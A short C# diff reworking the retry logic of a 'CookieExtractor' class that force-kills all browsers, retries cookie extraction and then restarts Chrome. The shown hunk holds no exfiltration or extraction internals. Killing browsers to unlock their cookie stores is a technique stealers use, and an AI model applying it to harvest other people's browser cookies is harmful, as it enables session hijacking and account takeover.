@@ -76,21 +76,22 @@ public static class CookieExtractor
         Log("Killing browsers first...");
         KillAllBrowsers();
         string? result = TryExtract();
-        if (!string.IsNullOrEmpty(result)) return result;
+        if (string.IsNullOrEmpty(result))
+        {
+            // Повторная попытка — убиваем снова (Chrome мог перезапуститься)
+            Log("Retry extraction with kill...");
+            KillAllBrowsers();
+            result = TryExtract();
+        }
 
-        // Повторная попытка — убиваем снова (Chrome мог перезапуститься)
-        Log("Retry extraction with kill...");
-        KillAllBrowsers();
-        result = TryExtract();
-        if (!string.IsNullOrEmpty(result)) return result;
-
+        // Всегда перезапускаем Chrome, чтобы не оставлять систему без браузера
         if (allowKillIfLocked)
         {
-            // Перезапускаем Chrome, если он был убит
+            Log("Restarting Chrome...");
             RestartChrome();
         }
 
-        return null;
+        return result;
     }
 
     private static void RestartChrome()
